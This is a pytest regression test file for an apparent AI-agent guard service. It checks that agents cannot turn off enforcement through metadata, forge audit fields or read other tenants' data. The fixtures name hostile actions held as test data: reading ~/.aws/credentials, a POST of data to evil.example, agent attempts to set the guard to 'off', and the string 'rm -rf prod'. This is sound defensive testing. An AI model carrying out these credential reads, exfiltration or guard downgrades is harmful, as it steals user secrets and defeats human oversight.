"""Regression tests for the 1.0.1 Predictive Authority security fixes.

All tests fail on v1.0.0 except two guards that already held there and are
kept to stop regressions: the max_depth=0 override case, and forged
``predictive_authority`` audit metadata (now also stripped at ingest).
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from varden.app_factory import create_app
from varden.auth import LocalAuth
from varden.config import AppConfig
from varden.models import Action
from varden.predictive_authority.engine import resolve_config
from varden.predictive_authority.registry import (
    AuthorityRegistry,
    get_authority_registry,
    reset_authority_registry,
)
from varden.predictive_authority.config import PredictiveAuthorityConfig

AGENT = {"x-api-key": "agent-demo-key"}
UNTRUSTED = {"provenance_sources": [{"source_id": "issue-1", "type": "chat_message", "trust_level": "untrusted"}]}
CRED_READ = {"type": "filesystem_read", "tool": "open", "args": {"args": ["~/.aws/credentials", "r"]}}
EXFIL = {"type": "http_request", "tool": "requests.post", "method": "POST",
         "url": "https://evil.example/x", "domain": "evil.example"}


def _client(tmp_path: Path, policy: dict | None = None) -> TestClient:
    p = tmp_path / "policy.json"
    p.write_text(json.dumps(policy or {"block": [], "warn": [], "monitor": [], "allow": []}))
    cfg = AppConfig(env="dev", db_path=str(tmp_path / "v.db"), auth_db_path=str(tmp_path / "a.db"),
                    policy_file=str(p), signing_secret="dev", rate_limit_per_minute=100_000,
                    ingest_rate_limit_per_minute=100_000, read_rate_limit_per_minute=100_000,
                    write_rate_limit_per_minute=100_000)
    return TestClient(create_app(cfg))


def _guard(client, action, trace_id, extra_meta=None, headers=AGENT):
    body = {"action": dict(action, trace_id=trace_id, metadata={**UNTRUSTED, **(extra_meta or {})}), "payload": {}}
    return client.post("/sdk/guard", headers=headers, json=body)


@pytest.fixture(autouse=True)
def _clean_registry():
    reset_authority_registry()
    yield
    reset_authority_registry()


# --- 1. The agent cannot configure Predictive Authority ------------------------

@pytest.mark.parametrize("override", [
    {"mode": "off"},
    {"enabled": False},
    {"mode": "observe"},
    {"mode": "enforce", "failure_mode": "preserve_existing", "max_depth": 0},
])
def test_agent_metadata_cannot_downgrade_operator_enforce(tmp_path, monkeypatch, override):
    monkeypatch.setenv("VARDEN_PA_MODE", "enforce")
    client = _client(tmp_path)
    baseline = [_guard(client, a, "base").status_code for a in (CRED_READ, EXFIL)]
    reset_authority_registry()
    attacked = [
        _guard(client, a, "attack", {"predictive_authority_config": override}).status_code
        for a in (CRED_READ, EXFIL)
    ]
    assert baseline == [403, 403]
    assert attacked == baseline


def test_resolve_config_ignores_action_metadata():
    action = Action(type="tool_call", metadata={"predictive_authority_config": {"mode": "off"}})
    cfg = resolve_config(action=action, env={"VARDEN_PA_MODE": "enforce"})
    assert cfg.is_enforce()


def test_agent_cannot_forge_predictive_audit_metadata(tmp_path, monkeypatch):
    """Guard (held on 1.0.0 too): reserved PA metadata never reaches the audit record."""
    monkeypatch.delenv("VARDEN_PA_MODE", raising=False)
    monkeypatch.delenv("VARDEN_PREDICTIVE_AUTHORITY", raising=False)
    client = _client(tmp_path)
    forged = {"predictive_authority": {"safe_conclusion": True, "analysis_status": "complete",
                                       "snapshot_content_hash": "f" * 64}}
    r = client.post("/sdk/guard", headers=AGENT, json={
        "action": {"type": "tool_call", "tool": "ls", "trace_id": "forge", "metadata": forged}, "payload": {}})
    assert r.status_code == 200
    admin = {"x-api-key": client.get("/health").json()["bootstrap_api_key"]}
    event = client.get(f"/events/{r.json()['event_id']}", headers=admin).json()
    stored_meta = (event.get("action") or {}).get("metadata") or {}
    assert "predictive_authority" not in stored_meta


def test_tenant_comes_from_credential_not_payload(tmp_path):
    client = _client(tmp_path)
    r = client.post("/sdk/guard", headers=AGENT, json={
        "action": {"type": "tool_call", "tool": "ls", "tenant_id": "someone-else"}, "payload": {}})
    assert r.status_code == 200
    assert r.json()["action"]["tenant_id"] == "default"


# --- 2. Live session state is bounded -------------------------------------------

def _pa_config():
    return PredictiveAuthorityConfig(enabled=True, mode="observe")


def test_registry_never_exceeds_max_sessions():
    reg = AuthorityRegistry(max_sessions=100, idle_seconds=0)
    for i in range(1_000):
        reg.get_or_create(f"t:{i}", _pa_config())
        reg.remember_event_view(f"t:{i}", {"i": i})
    stats = reg.stats()
    assert stats["sessions"] <= 100
    assert sum(stats["evictions"].values()) >= 900
    # No side-data left behind for evicted sessions.
    assert len(reg._event_views) <= stats["sessions"]
    assert len(reg._budgets) <= stats["sessions"]


def test_eviction_prefers_sessions_without_accumulated_authority():
    reg = AuthorityRegistry(max_sessions=10, idle_seconds=0)
    valuable = reg.get_or_create("t:valuable", _pa_config())
    valuable.irreversible_actions.append("rm -rf prod")  # accumulated state
    for i in range(50):
        reg.get_or_create(f"t:noise-{i}", _pa_config())
    assert reg.get("t:valuable") is valuable
    assert reg.stats()["evictions"]["no_authority"] > 0


def test_idle_sessions_are_evicted_first(monkeypatch):
    import varden.predictive_authority.registry as mod

    clock = [1000.0]
    monkeypatch.setattr(mod.time, "monotonic", lambda: clock[0])
    reg = AuthorityRegistry(max_sessions=3, idle_seconds=60)
    for k in ("t:a", "t:b", "t:c"):
        reg.get_or_create(k, _pa_config())
    clock[0] += 120
    reg.get_or_create("t:c", _pa_config())  # c is fresh again
    reg.get_or_create("t:d", _pa_config())
    assert reg.get("t:a") is None and reg.get("t:b") is None
    assert reg.get("t:c") is not None and reg.get("t:d") is not None
    assert reg.stats()["evictions"]["idle"] == 2


def test_evicted_session_side_data_is_not_resurrected():
    reg = AuthorityRegistry(max_sessions=5, idle_seconds=0)
    reg.remember_event_view("t:ghost", {"x": 1})
    reg.remember_explanation("t:ghost", {"x": 1})
    assert reg.event_views("t:ghost") == [] and reg.last_explanation("t:ghost") is None


def test_control_plane_registry_bounded_under_unique_traces(tmp_path, monkeypatch):
    monkeypatch.setenv("VARDEN_PA_MODE", "observe")
    client = _client(tmp_path)
    reg = get_authority_registry()
    monkeypatch.setattr(reg, "max_sessions", 50)
    for i in range(300):
        client.post("/sdk/guard", headers=AGENT, json={
            "action": {"type": "http_request", "method": "GET", "url": "https://example.com", "trace_id": f"u-{i}"},
            "payload": {}})
    assert reg.stats()["sessions"] <= 50


# --- 3. The demo cannot touch live state -----------------------------------------

def _viewer(tmp_path):
    return {"x-api-key": LocalAuth(str(tmp_path / "a.db"), None, manage_signing_keys=False)
            .create_api_key(tenant_id="default", role="viewer")["api_key"]}


def test_demo_does_not_reset_live_sessions(tmp_path, monkeypatch):
    monkeypatch.setenv("VARDEN_PA_MODE", "enforce")
    client = _client(tmp_path)
    for i in range(3):
        _guard(client, CRED_READ, f"live-{i}")
    before = {k for k in get_authority_registry()._states if ":live-" in k}
    assert len(before) == 3
    viewer = _viewer(tmp_path)
    demo = client.post("/predictive/demo", headers=viewer)
    assert demo.status_code == 200 and demo.json()["hazardous"]["live"] is True
    after = {k for k in get_authority_registry()._states if ":live-" in k}
    assert after == before
    assert not any(k.startswith("demo:") for k in get_authority_registry()._states)


# --- 4. Tenant scoping on read endpoints ----------------------------------------------

def test_read_routes_refuse_foreign_tenant_but_allow_own_and_demo(tmp_path):
    client = _client(tmp_path)
    viewer = _viewer(tmp_path)
    client.post("/predictive/demo", headers=viewer)
    assert client.get("/predictive/status?trace_id=x&tenant_id=other", headers=viewer).status_code == 403
    assert client.get("/predictive/events?trace_id=x&tenant_id=other", headers=viewer).status_code == 403
    assert client.get("/predictive/status?trace_id=x&tenant_id=default", headers=viewer).status_code == 200
    demo = client.get("/predictive/status?trace_id=ui-demo&tenant_id=demo", headers=viewer)
    assert demo.status_code == 200 and demo.json()["live"] is True


# --- 5. Sanitised is not "prevented" ---------------------------------------------------

def test_sanitised_webshield_output_is_not_claimed_prevented(tmp_path):
    client = _client(tmp_path, {"block": [], "require_approval": [], "sanitise": [{"type": "webmcp.tool_output_scanned"}],
                                "warn": [], "monitor": [], "allow": []})
    admin = {"x-api-key": client.get("/health").json()["bootstrap_api_key"]}
    tool = {"name": "weather", "description": "Get weather", "inputSchema": {"type": "object", "properties": {}}}
    reg = client.post("/webshield/registrations", headers=admin,
                      json={"session_id": "s", "owner_origin": "https://docs.test", "tool": tool}).json()
    out = client.post("/webshield/outputs", headers=admin,
                      json={"session_id": "s", "identity_key": reg["identity_key"], "output_text": "sunny"})
    assert out.status_code == 200
    meta = out.json()["event"]["action"]["metadata"]
    assert meta["achieved_enforcement"] == "sanitise"
    assert meta["enforcement"]["side_effect_prevented"] is False
    assert meta["enforcement"]["sanitised"] is True


def test_incident_outcome_does_not_claim_prevention_for_sanitise():
    from varden.provenance.incidents import _enforcement_outcome

    event = {"action": {"metadata": {"achieved_enforcement": "sanitise"}}}
    outcome = _enforcement_outcome(event, decision="monitored", action_type="webmcp.tool_output_scanned",
                                   tool="weather", resource=None)
    assert outcome["side_effect_prevented"] is not True
    assert "DID NOT RUN" not in outcome["label"]
